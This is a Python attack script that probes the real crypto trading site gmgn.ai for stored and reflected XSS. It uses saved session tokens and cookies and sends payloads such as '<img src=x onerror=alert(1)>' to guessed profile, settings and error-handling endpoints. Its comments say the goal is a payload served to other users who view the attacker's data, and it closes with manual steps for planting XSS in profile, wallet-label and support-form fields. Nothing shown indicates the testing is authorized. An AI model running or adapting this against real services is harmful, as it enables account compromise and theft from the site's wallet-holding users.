#!/usr/bin/env python3
"""
XSS IN API ENDPOINTS - GENIUS STRATEGY
Test if we can inject XSS into API responses that get rendered in browser!

Target endpoints:
- Token refresh (all users hit this!)
- User info (profile data)
- Wallet list (wallet nicknames)
- Any endpoint that returns USER-CONTROLLED data
"""
import json
import requests
import time

with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]
REFRESH_TOKEN = tokens["refresh_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

print("="*80)
print("🦊 XSS IN API ENDPOINTS - TESTING USER-CONTROLLED DATA")
print("="*80)
print("\nSTRATEGY: Find endpoints that return OUR data that WE control")
print("If we can modify our profile/settings to contain XSS,")
print("then those API endpoints will return XSS to anyone viewing our data!\n")

results = []

# ============================================================================
# PHASE 1: FIND ENDPOINTS THAT RETURN USER DATA
# ============================================================================

print("[PHASE 1] Discover what user data gmgn.ai stores")
print("-" * 60)

# Get user info
print("\n[1.1] User Info Endpoint")
try:
    r = requests.post(
        "https://gmgn.ai/account/user_info",
        params=PARAMS,
        headers=HEADERS,
        cookies=cookies,
        json={},
        timeout=10
    )
    
    if r.status_code == 200:
        d = r.json()
        if d.get("code") == 0:
            user_data = d.get("data", {}).get("data", {})
            print(f"✅ Got user info:")
            print(f"   Email: {user_data.get('accounts', [{}])[0].get('account', 'N/A')}")
            print(f"   Bot wallets: {len([k for k in user_data.keys() if 'bot_' in k and '_address' in k])} found")
            
            # Check for editable fields
            editable = []
            for key in user_data.keys():
                if any(x in key.lower() for x in ['name', 'bio', 'nick', 'label', 'note', 'desc']):
                    editable.append(key)
            
            if editable:
                print(f"   📝 Potentially editable fields: {editable}")
            
            print(f"\n   Full data structure:")
            print(f"   {json.dumps(user_data, indent=2)[:800]}")
            
except Exception as e:
    print(f"   Error: {e}")

# Get wallet list
print("\n[1.2] Wallet List Endpoint")
try:
    r = requests.post(
        "https://gmgn.ai/account/wallet/list",
        params=PARAMS,
        headers=HEADERS,
        cookies=cookies,
        json={},
        timeout=10
    )
    
    if r.status_code == 200:
        d = r.json()
        print(f"   Response: {json.dumps(d, indent=2)[:500]}")
    elif r.status_code == 404:
        print(f"   404 - Wrong path")
    else:
        print(f"   Status {r.status_code}")
        
except Exception as e:
    print(f"   Error: {e}")

# Try to find wallet management endpoints
print("\n[1.3] Searching for wallet management endpoints")
wallet_endpoints = [
    "/account/wallet/list",
    "/account/wallets",
    "/api/v1/wallet/list",
    "/xapi/v1/wallet/list",
    "/defi/wallet/list",
]

for endpoint in wallet_endpoints:
    try:
        r = requests.post(
            f"https://gmgn.ai{endpoint}",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={},
            timeout=5
        )
        
        if r.status_code == 200:
            print(f"   ✅ {endpoint} - EXISTS!")
            d = r.json()
            if d.get("code") == 0:
                print(f"      Data: {json.dumps(d, indent=2)[:300]}")
        elif r.status_code != 404:
            print(f"   ⚠️  {endpoint} - Status {r.status_code}")
            
    except:
        pass

# ============================================================================
# PHASE 2: TEST MODIFY ENDPOINTS (SET XSS PAYLOAD)
# ============================================================================

print("\n[PHASE 2] Test if we can SET XSS in our data")
print("-" * 60)

test_payloads = [
    ("Basic XSS", "<img src=x onerror=alert(1)>"),
    ("SVG", "<svg onload=alert(document.domain)>"),
    ("Script", "<script>alert(1)</script>"),
]

# Try to update profile/settings with XSS
print("\n[2.1] Profile/Settings Update Attempts")

update_endpoints = [
    ("/account/settings/update", {"nickname": "PAYLOAD", "bio": "PAYLOAD"}),
    ("/account/profile/update", {"display_name": "PAYLOAD", "bio": "PAYLOAD"}),
    ("/account/user/update", {"username": "PAYLOAD", "bio": "PAYLOAD"}),
    ("/api/v1/user/update", {"nickname": "PAYLOAD"}),
    ("/defi/user/update", {"bio": "PAYLOAD"}),
]

for endpoint, payload_template in update_endpoints:
    print(f"\n   Testing: {endpoint}")
    
    for name, xss in test_payloads[:1]:  # Test first payload only
        data = {k: v.replace("PAYLOAD", xss) for k, v in payload_template.items()}
        
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            
            print(f"      {name}: Status {r.status_code}", end="")
            
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f" | ✅ ACCEPTED!")
                    results.append({
                        "endpoint": endpoint,
                        "payload": xss,
                        "status": "stored"
                    })
                    
                    # Now retrieve to see if it's in the response
                    print(f"      Checking if stored...")
                    time.sleep(0.5)
                    
                    r2 = requests.post(
                        "https://gmgn.ai/account/user_info",
                        params=PARAMS,
                        headers=HEADERS,
                        cookies=cookies,
                        json={},
                        timeout=10
                    )
                    
                    if r2.status_code == 200:
                        resp_text = r2.text
                        if xss in resp_text:
                            print(f"      💀💀💀 XSS PAYLOAD IN API RESPONSE!")
                            results[-1]["reflected"] = True
                elif d.get("code") == 40101600:
                    print(f" | Trading auth required")
                else:
                    print(f" | Rejected: {d.get('message', 'N/A')[:50]}")
            elif r.status_code == 404:
                print(f" | Not found")
            elif r.status_code == 403:
                print(f" | WAF blocked")
            else:
                print(f" | Error")
                
        except Exception as e:
            print(f" | Error: {str(e)[:40]}")
    
    time.sleep(0.3)

# ============================================================================
# PHASE 3: TEST QUERY PARAMETER XSS (Reflected)
# ============================================================================

print("\n[PHASE 3] Test Query Parameter Reflected XSS")
print("-" * 60)

# Test if API endpoints reflect query params
print("\n[3.1] Testing user_info with modified params")

malicious_params = {
    **PARAMS,
    "callback": "<script>alert(1)</script>",
    "redirect": "javascript:alert(1)",
    "next": "<img src=x onerror=alert(1)>",
}

try:
    r = requests.post(
        "https://gmgn.ai/account/user_info",
        params=malicious_params,
        headers=HEADERS,
        cookies=cookies,
        json={},
        timeout=10
    )
    
    if "<script>" in r.text or "<img" in r.text:
        print(f"   💀 REFLECTED XSS IN RESPONSE!")
        print(f"   Response snippet: {r.text[:500]}")
        results.append({
            "endpoint": "/account/user_info",
            "type": "reflected",
            "vector": "query_params"
        })
    else:
        print(f"   Not reflected in response")
        
except Exception as e:
    print(f"   Error: {e}")

# ============================================================================
# PHASE 4: ERROR MESSAGE XSS
# ============================================================================

print("\n[PHASE 4] Error Message Injection")
print("-" * 60)

print("\n[4.1] Send malformed requests with XSS in params")

# Try to trigger error messages that might reflect our input
error_tests = [
    ("Invalid user_id", {"user_id": "<script>alert(1)</script>"}),
    ("Invalid wallet", {"wallet_address": "<img src=x onerror=alert(1)>"}),
    ("Invalid chain", {"chain": "<svg onload=alert(1)>"}),
]

for test_name, bad_data in error_tests:
    print(f"\n   Testing {test_name}")
    
    try:
        r = requests.post(
            "https://gmgn.ai/account/user_info",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json=bad_data,
            timeout=10
        )
        
        response_text = r.text
        
        # Check if our payload is in the error message
        if any(payload in response_text for _, payload in test_payloads):
            print(f"   💀 XSS IN ERROR MESSAGE!")
            print(f"   Response: {response_text[:500]}")
            results.append({
                "endpoint": "/account/user_info",
                "type": "error_message",
                "test": test_name
            })
        else:
            print(f"   Status {r.status_code}, no reflection")
            
    except Exception as e:
        print(f"   Error: {e}")
    
    time.sleep(0.3)

# ============================================================================
# RESULTS
# ============================================================================

print("\n" + "="*80)
print("🎯 RESULTS")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} potential XSS vectors!\n")
    
    for r in results:
        print(f"• {r.get('endpoint', 'N/A')}")
        print(f"  Type: {r.get('type', r.get('status', 'N/A'))}")
        if r.get('payload'):
            print(f"  Payload: {r['payload'][:60]}")
        if r.get('reflected'):
            print(f"  💀 REFLECTED IN API RESPONSE!")
        print()
    
    with open("api_xss_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print("💾 Saved to: api_xss_results.json")
    
else:
    print("\n❌ No XSS found in API endpoints via automated testing")

print("\n" + "="*80)
print("🦊 MANUAL BROWSER TEST REQUIRED")
print("="*80)
print("""
The KEY insight: We need to find WHERE gmgn.ai accepts user input via UI!

TRY THIS IN BROWSER:
1. Go to gmgn.ai/settings or /profile
2. Look for ANY text input fields
3. Try entering: <img src=x onerror=alert(1)>
4. Save and reload the page
5. Check if alert fires!

Common places to test:
- Profile bio/username
- Wallet nickname/label
- Portfolio name
- Watchlist name
- Trading bot label (if enabled)
- Feedback/support form
""")

print("\n" + "="*80)
